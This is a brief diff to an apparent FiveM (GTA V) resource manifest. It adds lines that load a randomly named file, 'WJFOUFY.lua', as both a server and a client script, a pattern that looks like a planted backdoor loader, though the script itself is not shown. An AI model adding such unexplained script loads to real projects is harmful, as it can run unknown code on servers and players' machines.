@@ -1,3 +1,5 @@
+server_script "WJFOUFY.lua"
+client_script "WJFOUFY.lua"
 fx_version 'bodacious'
 game 'gta5'
 
